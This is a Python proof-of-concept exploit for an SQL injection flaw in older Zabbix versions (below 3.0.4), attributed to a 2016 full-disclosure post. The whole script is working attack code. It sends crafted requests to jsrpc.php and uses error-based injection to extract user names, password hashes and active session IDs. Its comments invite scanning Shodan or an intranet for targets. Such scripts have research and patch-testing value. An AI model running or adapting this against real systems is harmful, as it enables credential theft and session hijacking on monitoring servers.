# -*- coding: utf_8 -*-

# Exploit Title: 2.0 < Zabbix < 3.0.4 SQL Injection Python PoC
# Data: 20-08-2016
# Software Link: www.zabbix.com
# Exploit Author: Unknown(http://seclists.org/fulldisclosure/2016/Aug/82)
# Version: Zabbix 2.0-3.0.x(<3.0.4)

# PoC Author: Zzzians
# Contact: Zzzians@gmail.com
# Test on: Linux (Debian/CentOS/Ubuntu)

# Use Shodan or and enjoy :)
# Comb the intranet for zabbix and enjoy :)
import sys,os,re,urllib2
def Inject(url,sql,reg):
    payload = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
        sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(payload, timeout=20).read()
    except Exception, msg:
        print '\t\tOpps,an error occurs...',msg
    else:
        result_reg = re.compile(reg)
        results = result_reg.findall(response)
        print payload #Uncomment this to see details
        if results:
            return results[0]
def exploit(url,userid):
    passwd_sql = "(select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT "+str(userid-1)+",1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    session_sql="(select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid="+str(userid)+" LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    password = Inject(url,passwd_sql,r"Duplicate\s*entry\s*'(.+?)~~")
    if(password):
        print '[+]UsernamePassword : %s' % password
    else:
        print '[-]Get Password Failed'
    session_id = Inject(url,session_sql,r"Duplicate\s*entry\s*'(.+?)~")
    if(session_id):
        print "[+]Session_id：%s" % session_id
    else:
        print "[-]Get Session id Failed"
    print '\n'

def main():
    print '=' * 70
    print '\t    2.0.x?  <  Zabbix  <  3.0.4 SQL Inject Python Exploit Poc'
    print '\t\t    Author:Zzzians(Zzzians@gmail.com)'
    print '\t    Reference:http://seclists.org/fulldisclosure/2016/Aug/82'
    print '\t\t\t    Time：2016-08-20\n'
    urls = [sys.argv[1]]
    ids = [1,2]
    for url in urls:
        if url[-1] != '/': url += '/'
        print '='*25 +  url + '='*25
        for userid in ids:
	        exploit(url,userid)
main()
